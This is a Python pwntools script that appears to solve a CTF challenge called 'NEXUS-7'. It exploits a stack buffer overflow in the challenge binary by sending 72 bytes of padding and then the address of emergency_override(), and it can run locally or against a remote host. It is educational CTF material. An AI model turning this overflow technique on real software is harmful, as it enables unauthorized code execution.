#!/usr/bin/env python3
"""
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘              NEXUS-7 EXPLOIT - Abandoned Space Station CTF               â•‘
â•‘                                                                           â•‘
â•‘   Vulnerability: Stack Buffer Overflow (ret2win)                         â•‘
â•‘   Target: Overflow signal_buffer to overwrite return address             â•‘
â•‘   Goal: Redirect execution to emergency_override() function              â•‘
â•‘   Flag Format: GTH{...}                                                   â•‘
â•‘                                                                           â•‘
â•‘   "In space, no one can hear you overflow."                              â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

Usage:
    Local:  python3 exploit.py LOCAL
    Remote: python3 exploit.py REMOTE <host> <port>

Example:
    python3 exploit.py LOCAL
    python3 exploit.py REMOTE challenge.ctf.com 9002
"""

from pwn import *
import sys

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# CONFIGURATION
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

BINARY = './nexus7'

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# SETUP
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

def setup_context():
    """Configure pwntools for x86_64."""
    context.arch = 'amd64'
    context.os = 'linux'
    context.endian = 'little'
    context.log_level = 'info'

def get_process():
    """Get local or remote process."""
    if len(sys.argv) >= 2 and sys.argv[1] == 'REMOTE':
        if len(sys.argv) < 4:
            log.error("Usage: python3 exploit.py REMOTE <host> <port>")
            sys.exit(1)
        host = sys.argv[2]
        port = int(sys.argv[3])
        log.info(f"Connecting to {host}:{port}")
        return remote(host, port)
    else:
        log.info(f"Starting local: {BINARY}")
        return process(BINARY)

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# EXPLOIT
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

def find_offset():
    """
    Find the offset to overwrite the return address.
    
    Buffer is 64 bytes, but we need to account for:
    - The buffer itself (64 bytes)
    - Saved RBP (8 bytes on x86_64)
    = 72 bytes total before return address
    """
    return 72

def get_win_function(elf):
    """Get the address of emergency_override()."""
    win_addr = elf.symbols['emergency_override']
    log.success(f"emergency_override @ {hex(win_addr)}")
    return win_addr

def exploit(p, offset, win_addr):
    """
    Send the exploit payload.
    
    Payload structure:
    [padding: 72 bytes] [return address: 8 bytes]
    """
    log.info("Crafting payload...")
    
    # Build payload
    payload = b'A' * offset          # Fill buffer + saved RBP
    payload += p64(win_addr)          # Overwrite return address
    
    log.info(f"Payload size: {len(payload)} bytes")
    log.info(f"Offset: {offset}, Target: {hex(win_addr)}")
    
    # Navigate to distress signal (option 3)
    p.sendlineafter(b'>', b'3')
    
    # Send the overflow
    p.sendlineafter(b'>', payload)
    
    log.success("Payload sent!")

def get_flag(p):
    """Extract the flag from output."""
    try:
        response = p.recvall(timeout=3).decode(errors='ignore')
        
        import re
        flag_match = re.search(r'GTH\{[^}]+\}', response)
        
        if flag_match:
            return flag_match.group(0)
        else:
            print(response)
            return None
    except:
        return None

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# MAIN
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

def main():
    print("""
    â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
    â•‘          NEXUS-7 EXPLOIT - Buffer Overflow Attack            â•‘
    â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    """)
    
    setup_context()
    
    # Load binary to get addresses
    elf = ELF(BINARY, checksec=False)
    
    # Get target function address
    win_addr = get_win_function(elf)
    
    # Calculate offset
    offset = find_offset()
    
    # Start process
    p = get_process()
    
    # Wait for menu
    p.recvuntil(b'Terminal online')
    
    try:
        # Send exploit
        exploit(p, offset, win_addr)
        
        # Get flag
        flag = get_flag(p)
        
        if flag:
            print("\n" + "="*60)
            print(f"  ğŸš€ FLAG: {flag}")
            print("="*60 + "\n")
        else:
            log.warning("Could not extract flag, entering interactive mode...")
            p.interactive()
            
    except Exception as e:
        log.error(f"Exploit failed: {e}")
        p.close()
        return 1
    
    return 0

if __name__ == '__main__':
    exit(main())
